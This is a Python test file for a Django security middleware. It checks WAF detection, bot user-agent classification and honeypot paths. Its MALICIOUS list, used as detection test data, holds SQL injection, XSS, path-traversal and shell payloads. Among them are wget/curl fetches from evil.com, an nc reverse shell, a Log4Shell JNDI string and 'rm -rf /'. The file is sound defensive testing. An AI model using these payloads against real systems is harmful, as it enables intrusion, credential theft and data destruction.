"""Signature quality: real payloads are caught, ordinary text is not.

The benign list is the important half. A WAF that flags "drop table lamp" in a
product search is worse than no WAF, because the first false positive teaches
everyone to switch the layer off.
"""
from __future__ import annotations

from urllib.parse import urlencode

import pytest
from django.test import override_settings

from django_bouncer.middleware import _helpers as H
from django_bouncer.middleware.bot_detector import classify_ua, is_good_bot
from django_bouncer.middleware.honeypot import match_honeypot_path
from django_bouncer.middleware.waf import (
    _SUSPICIOUS_PATH_PATTERNS,
    _check_text,
    check_body,
    check_url,
)

from .conftest import CHROME, rf

# ── WAF ──────────────────────────────────────────────────────────────────

MALICIOUS = [
    "1' UNION SELECT username, password FROM users--",
    "1 union all select 1,2,3",
    "' OR 1=1--", "' or '1'='1", "admin' --", "1 AND SLEEP(5)",
    "1; waitfor delay '0:0:5'", "select * from information_schema.tables",
    "SELECT name FROM users WHERE id=1", "select version()", "select @@version",
    "concat(0x7e,version())", "1' and extractvalue(1,concat(0x7e,version()))--",
    "/*!50000select*/ 1", "'; drop table users;--", "; delete from users where 1",
    "<script>alert(1)</script>", "<ScRiPt src=//evil.com>", "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(document.cookie)>", "javascript:alert(document.cookie)",
    "<a href=\"javascript:alert(1)\">x</a>", "<iframe srcdoc='<script>x</script>'>",
    "<body onload=alert(1)>", "eval(atob('YWxlcnQoMSk='))",
    "String.fromCharCode(88,83,83)", "document.cookie", "vbscript:msgbox(1)",
    "../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/etc/passwd",
    "/proc/self/environ", "%2e%2e%2f%2e%2e%2fetc", "..%c0%af..%c0%af",
    "; cat /etc/passwd", "| wget http://evil.com/x.sh", "$(curl -s http://evil/x)",
    "; nc -e /bin/sh 1.2.3.4 4444", "&& rm -rf /", "`whoami`", "; sh -c 'id'",
    "/dev/tcp/1.2.3.4/80", "${jndi:ldap://evil.com/a}", "; python -c 'import os'",
]

BENIGN = [
    # SQL words in ordinary prose
    "Please select the model from the list and click download",
    "select model from list", "How to delete from cart?", "Insert into scene as prefab",
    "drop table lamp 3d model", "Update product set includes 3 textures",
    "Low-poly table -- optimized for games", "foo -- bar -- baz",
    "/* CSS reset */ body { margin: 0 }", "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
    "Kitchen table and 2 chairs = 3 items", "and 2 = 2 stools",
    "It's a great model -- thanks!", "select or deselect layers",
    # JS/HTML words in ordinary prose
    "JavaScript: The Good Parts", "what is an onclick handler?", "onload event tutorial",
    "How do I use document.getElementById?", "how to embed an iframe",
    "<b>bold</b> and <i>italic</i>", "<a href=\"https://sketchfab.com/x\">Sketchfab</a>",
    "<iframe src=\"https://sketchfab.com/models/abc/embed\"></iframe>",
    "alert() usage", "what is eval", "expression of the face",
    # path-like
    "../textures/wood.png", "../../assets/tex.png", "textures are at ../Textures/",
    "C:\\Users\\me\\models", "/products/mysql-icon-pack/", "boot.png",
    # shell-like
    "name; id; price", "cat and dog", "sh - shorthand", "curl -o file.zip URL",
    "wget https://example.com/file.zip", "python -c is handy", "rm -rf node_modules",
    "Price: 5$ (cheap)", "a | b | c", "chmod 755 script.sh",
    # ordinary searches
    "sci-fi door", "wooden desk (rectangular)", "Turkish characters şğüçö",
    "'quoted'", "it's", "50% off", "a=b&c=d", "user@example.com",
    "https://example.com/?x=1",
    "select from menu -> export", "SELECT * FROM", "select * from users",
]


class TestWAFSignatures:
    @pytest.mark.parametrize("payload", MALICIOUS)
    def test_malicious_detected(self, payload):
        assert _check_text(payload) is not None, payload

    @pytest.mark.parametrize("text", BENIGN)
    def test_benign_passes(self, text):
        assert _check_text(text) is None, text

    def test_url_is_decoded_once(self):
        assert check_url("/products/?q=1%27%20UNION%20SELECT%20a%2Cb%20FROM%20x--")
        assert check_url("/search/?q=select+model+from+list") is None
        assert check_url("/products/?q=..%2Ftextures") is None   # a single ../ is harmless
        assert check_url("/x/?f=..%2F..%2F..%2Fetc%2Fpasswd") is not None

    @staticmethod
    def _form(**fields):
        return rf.post(
            "/contact/",
            data=urlencode(fields),
            content_type="application/x-www-form-urlencoded",
        )

    def test_form_fields_scanned_individually(self):
        request = self._form(
            name="Ada",
            message="select model from list and click -- done",
            password="' OR 1=1--",          # secret fields are skipped
            csrfmiddlewaretoken="abc",
        )
        assert check_body(request) is None

        assert check_body(self._form(message="<script>alert(1)</script>")) is not None
        assert check_body(self._form(q="1 union select a from b")) is not None
        assert (
            check_body(
                self._form(
                    description=(
                        'Textures: ../tex/  <iframe src="https://sketchfab.com/e"></iframe>'
                    )
                )
            )
            is None
        )

    def test_json_body_scanned_raw(self):
        bad = rf.post(
            "/api/x/",
            data='{"q": "1 union select a from b"}',
            content_type="application/json",
        )
        good = rf.post(
            "/api/x/",
            data='{"q": "select the model from the list"}',
            content_type="application/json",
        )
        assert check_body(bad) is not None
        assert check_body(good) is None

    def test_multipart_upload_is_not_scanned(self):
        request = rf.post("/upload/", data={"desc": "<script>x</script>"})
        assert "multipart" in request.META["CONTENT_TYPE"]
        assert check_body(request) is None

    @pytest.mark.parametrize(
        "path",
        [
            "/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/phpmyadmin/", "/pma/",
            "/.env", "/.git/HEAD", "/backup.zip", "/shell.php", "/index.php",
            "/foo/bar.php?x=1", "/cgi-bin/test.cgi", "/actuator/health", "/console/",
            "/vendor/phpunit/x", "/.aws/credentials", "/config.bak",
        ],
    )
    def test_scanner_paths(self, path):
        assert H.any_match(path, _SUSPICIOUS_PATH_PATTERNS), path

    @pytest.mark.parametrize(
        "path",
        [
            "/", "/products/", "/products/mysql-icon-pack/", "/products/pma-tool/",
            "/categories/console/", "/accounts/login/", "/admin/", "/api/products/",
            "/products/old-house-3d/", "/tags/php-logo/",
            "/collections/backup-generator/", "/products/wp-theme-mockup/",
            "/blog/solr-cabinet/", "/products/pl-model/",
        ],
    )
    def test_legitimate_paths_are_not_scanner_paths(self, path):
        assert H.any_match(path, _SUSPICIOUS_PATH_PATTERNS) is None, path


# ── Bot classification ───────────────────────────────────────────────────

class TestBotUA:
    def test_browsers_pass(self):
        assert classify_ua(CHROME) is None
        assert (
            classify_ua(
                "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) "
                "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 "
                "Mobile/15E148 Safari/604.1"
            )
            is None
        )
        # Electron is not in the headless list: a desktop app is a real client.
        assert classify_ua(CHROME + " Electron/28.0.0 MyDesktopApp/1.0") is None

    def test_tiers(self):
        assert classify_ua("sqlmap/1.7#stable (https://sqlmap.org)")[0] == "scanner"
        assert classify_ua("Mozilla/5.0 (Nikto/2.1.6)")[0] == "scanner"
        assert classify_ua("python-requests/2.31")[0] == "scraper"
        assert classify_ua("curl/8.4.0")[0] == "scraper"
        assert classify_ua("axios/1.6.0")[0] == "scraper"
        assert classify_ua(CHROME.replace("Chrome/", "HeadlessChrome/"))[0] == "headless"
        assert classify_ua("")[0] == "empty"
        assert classify_ua("Mozilla/5.0")[0] == "empty"

    @override_settings(BOUNCER_ALLOWED_UA_TOKENS="MyMobileSDK")
    def test_first_party_client_can_be_allowed(self):
        assert classify_ua("okhttp/4.12 MyMobileSDK/2.0") is None
        assert classify_ua("okhttp/4.12")[0] == "scraper"

    @override_settings(BOUNCER_SCANNER_UAS="internal-scan-tool")
    def test_scanner_list_is_extensible(self):
        assert classify_ua("internal-scan-tool/1.0 something")[0] == "scanner"

    def test_good_bots(self):
        assert is_good_bot(
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        )
        assert is_good_bot("Google-InspectionTool/1.0")
        assert is_good_bot(
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        )
        assert is_good_bot("TelegramBot (like TwitterBot)")
        assert is_good_bot("Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)")
        assert is_good_bot("Mozilla/5.0 (compatible; Cloudflare-Healthchecks/1.0)")
        assert not is_good_bot(CHROME)


# ── Honeypot paths ───────────────────────────────────────────────────────

class TestHoneypotPaths:
    @pytest.mark.parametrize(
        "path",
        [
            "/wp-login.php", "/wp-admin/", "/wp-admin/admin-ajax.php", "/.env",
            "/.git/config", "/phpmyadmin/index.php", "/console", "/en/wp-login.php",
            "/xmlrpc.php", "/administrator/", "/backup.zip",
        ],
    )
    def test_hits(self, path):
        assert match_honeypot_path(path)

    @pytest.mark.parametrize(
        "path",
        [
            "/products/console/", "/products/game-console-3d/", "/categories/mysql/",
            "/blog/console/", "/blog/exchange/", "/products/backup.zip-model/",
            "/.well-known/security.txt", "/accounts/login/", "/", "/admin/",
            "/admin/login/", "/products/wp-admin-theme/", "/collections/console",
        ],
    )
    def test_legitimate_paths_are_not_honeypots(self, path):
        assert match_honeypot_path(path) is None

    @override_settings(BOUNCER_HONEYPOT_PATHS="/secret-trap/")
    def test_project_can_add_paths(self):
        assert match_honeypot_path("/secret-trap/") == "/secret-trap/"
